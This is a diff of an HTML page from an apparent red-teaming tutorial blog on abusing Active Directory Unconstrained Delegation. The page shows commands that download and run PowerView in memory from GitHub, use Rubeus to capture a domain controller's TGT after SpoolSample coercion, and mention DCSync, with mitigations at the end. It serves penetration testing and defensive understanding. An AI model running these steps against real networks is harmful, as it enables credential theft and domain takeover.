@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="turbo-root" content="/Red-Teaming-Army">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.756315001510">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.760173018025">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.5.0">
@@ -15,29 +15,27 @@
     <meta name="description" content="In the world of Active Directory, a lot of attacks are based on delegation misconfigurations.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/unleashing-the-power-of-unconstrained-delegation/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/attacks/unleashing-the-power-of-unconstrained-delegation/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/unleashing-the-power-of-unconstrained-delegation/">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/attacks/unleashing-the-power-of-unconstrained-delegation/">
     <meta property="og:title" content="Unleashing the Power of Unconstrained Delegation">
     <meta property="og:description" content="In the world of Active Directory, a lot of attacks are based on delegation misconfigurations.">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/unleashing-the-power-of-unconstrained-delegation/">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/attacks/unleashing-the-power-of-unconstrained-delegation/">
     <meta property="twitter:title" content="Unleashing the Power of Unconstrained Delegation">
     <meta property="twitter:description" content="In the world of Active Directory, a lot of attacks are based on delegation misconfigurations.">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../favicon.ico" rel="icon">
-    <link href="../../resources/css/retype.css?v=3.5.0.756315001510" rel="stylesheet">
+    <link href="../../../resources/css/retype.css?v=3.5.0.760173018025" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.5.0.756315001510" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.5.0.756315001510" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.5.0.756315001510" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.760173018025" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.760173018025" data-turbo-eval="false" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -52,7 +50,7 @@
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-xl">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-xl">
                             <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Red Teaming Army</span>
                         </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Docs</span>
                     </div>
@@ -338,9 +336,9 @@
     </h2>
 </doc-anchor-target>
 <p>In the world of Active Directory, a lot of attacks are based on delegation misconfigurations. Depending on the context, they may allow the attacker to laterally move across the network, achieve local / domain privilege escalation or even compromise the Domain Controller (DC).</p>
-<p>In this blog we are diving into <strong>Unconstrained Delegation</strong>.</p>
-<p>If you prefer watching a video instead of reading, you can find my video walkthrough on the topic here: <a href="https://www.youtube.com/watch?v=eDmkkL108W4">Attacking Active Directory: Unleashing the Power of Unconstrained Delegation (youtube.com)</a></p>
-<p>Do not forget to join the Red Teaming Army&#x27;s Discord server where we share knowledge, experience, and debug together in real time: <a href="https://discord.gg/bgSpdheEgu">https://discord.gg/bgSpdheEgu</a></p>
+<p>In this blog we are diving into <strong>Unconstrained Delegation</strong>.</p>
+<p>If you prefer watching a video instead of reading, you can find my video walkthrough on the topic here: <a href="https://www.youtube.com/watch?v=eDmkkL108W4">Attacking Active Directory: Unleashing the Power of Unconstrained Delegation (youtube.com)</a></p>
+<p>Do not forget to join the Red Teaming Army&#x27;s Discord server where we share knowledge, experience, and debug together in real time: <a href="https://discord.gg/bgSpdheEgu">https://discord.gg/bgSpdheEgu</a></p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -354,7 +352,7 @@
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Also, if you have further appreciation for my work you can become my Patreon: <a href="https://www.patreon.com/Lsecqt">Lsecqt | Creating Pentesting / Red Teaming Videos | Patreon</a>. This helps me a lot.</p>
+<p>Also, if you have further appreciation for my work you can become my Patreon: <a href="https://www.patreon.com/Lsecqt">Lsecqt | Creating Pentesting / Red Teaming Videos | Patreon</a>. This helps me a lot.</p>
         </div>
     </div>
 </div>
@@ -370,9 +368,8 @@
         <span>What is Delegation?</span>
     </h3>
 </doc-anchor-target>
-<p>In a nutshell, <strong>delegation</strong> is the act of granting specific user / machine / service elevated rights towards other user / machine / service.  Usually such privileges are granted on computers that run various services, like MSSQL / IIS or on users with bigger administrative needs.</p>
-<p>To better understand it, let&#x27;s take the following example:
-A user is authenticating and operating to IIS service which is connected to a MSSQL database. When the DB backend needs to be modified the IIS server connects to it on behalf of the user, thus, the IIS service or perhaps the whole machine could be entrusted for delegation.</p>
+<p>In a nutshell, <strong>delegation</strong> is the act of granting specific user / machine / service elevated rights towards other user / machine / service. Usually such privileges are granted on computers that run various services, like MSSQL / IIS or on users with bigger administrative needs.</p>
+<p>To better understand it, let&#x27;s take the following example: A user is authenticating and operating to IIS service which is connected to a MSSQL database. When the DB backend needs to be modified the IIS server connects to it on behalf of the user, thus, the IIS service or perhaps the whole machine could be entrusted for delegation.</p>
 <p>Another example would be to entrust sysadmins or HelpDesk users to perform operational roles (create, manage and delete) for other domain users. In this case, specific tasks in the context of the Active Directory would be delegated to specific group of people.</p>
 <doc-anchor-target id="what-is-unconstrained-delegation">
     <h3>
@@ -381,7 +378,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
     </h3>
 </doc-anchor-target>
 <p>Normally, the delegations across the Active Directory should be strictly configured. It should explicitly map the delegated user / machine to the specific services and nothing more.</p>
-<p><strong>Unconstrained Delegation</strong> also known as Unrestricted Delegation is characterized with that it is NOT limited to specific service, but instead it impersonates the designed user / machine with all of its access rights and permissions across the AD context. Unrestricted Delegation is designed to save the delegated user&#x27;s TGT directly into the computer&#x27;s memory.</p>
+<p><strong>Unconstrained Delegation</strong> also known as Unrestricted Delegation is characterized with that it is NOT limited to specific service, but instead it impersonates the designed user / machine with all of its access rights and permissions across the AD context. Unrestricted Delegation is designed to save the delegated user&#x27;s TGT directly into the computer&#x27;s memory.</p>
 <p>For instance, if we take the previous User -&gt; ISS -&gt; MSSQL example, if the same scenario was replicated with configured Unconstrained Delegation, the IIS service would obtain a valid TGT for the user connecting to it.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
@@ -428,20 +425,17 @@ A user is authenticating and operating to IIS service which is connected to a MS
 <ol>
 <li>Import it</li>
 </ol>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">iex(new-object net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')</code></pre>
-</doc-codeblock></div>
+<p><code v-pre>iex(new-object net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')</code></p>
 <ol start="2">
 <li>Scan for Unconstrained Delegation:</li>
 </ol>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">Get-DomainComputer -Unconstrained</code></pre>
-</doc-codeblock></div>
+<p><code v-pre>Get-DomainComputer -Unconstrained</code></p>
 <p><figure class="content-center">
     <img src="get-domaincomputer.png" alt="Finding machines marked for Unconstrained Delegation">
     <figcaption class="caption">Finding machines marked for Unconstrained Delegation</figcaption>
 </figure>
 </p>
+<p>Finding machines marked for Unconstrained Delegation</p>
 <p>The following output reveals 2 machines that have Unrestricted Delegation enabled. This means:</p>
 <ol>
 <li>Any user connecting via any service on any of the mentioned machines will have his TGT saved inside the memory of the corresponding machine.</li>
@@ -471,12 +465,13 @@ A user is authenticating and operating to IIS service which is connected to a MS
     </h4>
 </doc-anchor-target>
 <p>It is also possible to find computer accounts marked for Unconstrained Delegation via BloodHound. I am not going to dive deep into how BloodHound operates, but in a nutshell:</p>
-<p>When you import the collected data from the Active Directory into BloodHound, you can use the following option for finding  accounts allowed for Unconstrained Delegation:</p>
+<p>When you import the collected data from the Active Directory into BloodHound, you can use the following option for finding accounts allowed for Unconstrained Delegation:</p>
 <p><figure class="content-center">
     <img src="bloodhound_unconstrained.png" alt="Finding machines marked for Unconstrained Delegation with BloodHound">
     <figcaption class="caption">Finding machines marked for Unconstrained Delegation with BloodHound</figcaption>
 </figure>
 </p>
+<p>Finding machines marked for Unconstrained Delegation with BloodHound</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -515,18 +510,16 @@ A user is authenticating and operating to IIS service which is connected to a MS
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Keep in mind that it is super common to encounter Unconstrained Delegation flag on Domain Controllers, since this is part of their operational work and they are by default trusted! Even if they are missing the flag, they can still be compromised if authentication coercion is possible!</p>
+<p>Keep in mind that it is super common to encounter Unconstrained Delegation flag on Domain Controllers, since this is part of their operational work and they are by default trusted! Even if they are missing the flag, they can still be compromised if authentication coercion is possible and the compromised machine has the flag enabled!</p>
         </div>
     </div>
 </div>
-<p>For instance, in this example, we have already compromised <code v-pre>$Client01</code> machine and our target is <code v-pre>$DC01</code>.</p>
-<p>While there are various ways of executing this attack, I prefer doing it with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>.</p>
+<p>For instance, in this example, we have already compromised <code v-pre>$Client01</code> machine and our target is <code v-pre>$DC01</code>.</p>
+<p>While there are various ways of executing this attack, I prefer doing it with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>.</p>
 <p>Rubeus has monitor mode support, which means it can effectively listen for incoming authentication and will automatically retrieve the TGT if it is stored!</p>
 <p>Let&#x27;s start Rubeus in monitor mode:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">.\Rubeus.exe monitor /interval:10 /filteruser:dc01$</code></pre>
-</doc-codeblock></div>
-<p>This command will also filter the results based on its originating account. In this case, to have a clean output, we are interested in the Domain Controller&#x27;s machine account <code v-pre>DC01$</code></p>
+<p><code v-pre>.\Rubeus.exe monitor /interval:10 /filteruser:dc01$</code></p>
+<p>This command will also filter the results based on its originating account. In this case, to have a clean output, we are interested in the Domain Controller&#x27;s machine account <code v-pre>DC01$</code></p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -540,7 +533,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Keep in mind that since our compromised machine <code v-pre>Client01$</code> is marked for Unconstrained Delegation, by not filtering the tickets account, you can get overwhelmed. Not filtering can be extremely useful in different scenarios, but now the target is <code v-pre>DC01$</code></p>
+<p>Keep in mind that since our compromised machine <code v-pre>Client01$</code> is marked for Unconstrained Delegation, by not filtering the tickets account, you can get overwhelmed. Not filtering can be extremely useful in different scenarios, but now the target is <code v-pre>DC01$</code></p>
         </div>
     </div>
 </div>
@@ -549,8 +542,9 @@ A user is authenticating and operating to IIS service which is connected to a MS
     <figcaption class="caption">Starting Rubeus in monitor mode</figcaption>
 </figure>
 </p>
+<p>Starting Rubeus in monitor mode</p>
 <p>The next step is to either wait for any form of authentication or force it! This may vary depending from your context and objectives, for example, phishing attacks for SMB path spoofing can be implemented, tricking users to connect to the Unconstrained machines.</p>
-<p>In this example, we will perform coercion via <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> to trigger the authentication.</p>
+<p>In this example, we will perform coercion via <a href="https://github.com/leechristensen/SpoolSample">SpoolSample</a> to trigger the authentication.</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -564,38 +558,35 @@ A user is authenticating and operating to IIS service which is connected to a MS
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Keep in mind that coercion can be triggered via various tools such as <a href="https://github.com/p0dalirius/Coercer">Coercer</a> or <a href="https://github.com/topotam/PetitPotam">Petitpotam</a>, do not limit yourself with anything specific! Different tools will work in different cases.</p>
+<p>Coercion can be triggered via various tools such as <a href="https://github.com/p0dalirius/Coercer">Coercer</a> or <a href="https://github.com/topotam/PetitPotam">Petitpotam</a>, do not limit yourself with anything specific! Different tools will work in different cases.</p>
         </div>
     </div>
 </div>
 <p>The syntax is fairly simple:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">.\SpoolSample.exe Target_Server Capture_Server</code></pre>
-</doc-codeblock></div>
+<p><code v-pre>.\SpoolSample.exe Target_Server Capture_Server</code></p>
 <p>Which will get translated to:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">.\SpoolSample.exe dc01 client01</code></pre>
-</doc-codeblock></div>
+<p><code v-pre>.\SpoolSample.exe dc01 client01</code></p>
 <p><figure class="content-center">
     <img src="spoolsample.png" alt="Triggering the authentication from the DC to our capture server via SpoolSample">
     <figcaption class="caption">Triggering the authentication from the DC to our capture server via SpoolSample</figcaption>
 </figure>
 </p>
+<p>Triggering the authentication from the DC to our capture server via SpoolSample</p>
 <p>Now if we go back and check the Rubeus process, we can observer that the TGT from the Domain Controller&#x27;s machine account was successfully dumped and injected.</p>
 <p><figure class="content-center">
     <img src="dc_ticket_captured.png" alt="Capturing TGT from the Domain Controller's machine account">
     <figcaption class="caption">Capturing TGT from the Domain Controller&#x27;s machine account</figcaption>
 </figure>
 </p>
+<p>Capturing TGT from the Domain Controller&#x27;s machine account</p>
 <p>We can confirm that the ticket is injected by running:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-powershell"><code v-pre class="language-powershell">klist</code></pre>
-</doc-codeblock></div>
+<p><code v-pre>klist</code></p>
 <p><figure class="content-center">
     <img src="klist.png" alt="Confirming that the dc01$ ticket is imported">
-    <figcaption class="caption">Confirming that the <code v-pre>dc01$</code> ticket is imported</figcaption>
+    <figcaption class="caption">Confirming that the dc01$ ticket is imported</figcaption>
 </figure>
 </p>
+<p>Confirming that the <code v-pre>dc01$</code> ticket is imported</p>
 <p>Armed with the ticket we can compromise the Domain Controller or directly perform DCSync.</p>
 <doc-anchor-target id="conclusion">
     <h2>
@@ -604,7 +595,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
     </h2>
 </doc-anchor-target>
 <p>Again we are faced against the calculation between scalability and security. Of course it is easier to just setup things to be relevant to all services, but this can come with huge risk. Let’s discuss how to mitigate it!</p>
-<p>First of all is disabling <code v-pre>Print Spooler</code> service, especially if you do not need it! By disabling coercion you can reduce the risk and the chance for this attack. However, as mentioned before, this is not the only way of executing it, thus, by removing coercion misconfigurations, you can still get pwned!</p>
+<p>First of all is disabling <code v-pre>Print Spooler</code> service, especially if you do not need it! By disabling coercion you can reduce the risk and the chance for this attack. However, as mentioned before, this is not the only way of executing it, thus, by removing coercion misconfigurations, you can still get pwned!</p>
 <div class="flex mb-6">
     <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
     <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
@@ -618,7 +609,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-<p>Keep in mind that <code v-pre>Print Spooler</code> is just one service / interface that can trigger authentication, there are many, many more ways to do coercion attacks. It is recommended to disable them all, unless you have practical use for them.</p>
+<p>Important note: <code v-pre>Print Spooler</code> is just one service / interface that can trigger authentication, there are many, many more ways to do coercion attacks. It is recommended to disable them all, unless you have practical use for them.</p>
         </div>
     </div>
 </div>
@@ -635,7 +626,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
                             
                                 <nav class="flex mt-14">
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
                                                 <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
@@ -645,10 +636,10 @@ A user is authenticating and operating to IIS service which is connected to a MS
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../malware-development/weaponizing-dll-hijacking-via-dll-proxying/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../active-directory/enumeration/visualizing-acls-with-adalanche/">
                                             <span>
                                                 <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
-                                                <span class="block mt-1">Weaponizing DLL Hijacking via DLL Proxying</span>
+                                                <span class="block mt-1">Visualizing AC​Ls with Adalanche</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                         </a>
@@ -663,7 +654,7 @@ A user is authenticating and operating to IIS service which is connected to a MS
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2023. All rights reserved.</p></div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
@@ -692,6 +683,6 @@ A user is authenticating and operating to IIS service which is connected to a MS
 
     <div id="docs-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Unleashing the Power of Unconstrained Delegation", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Unleashing the Power of Unconstrained Delegation", level: 3, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
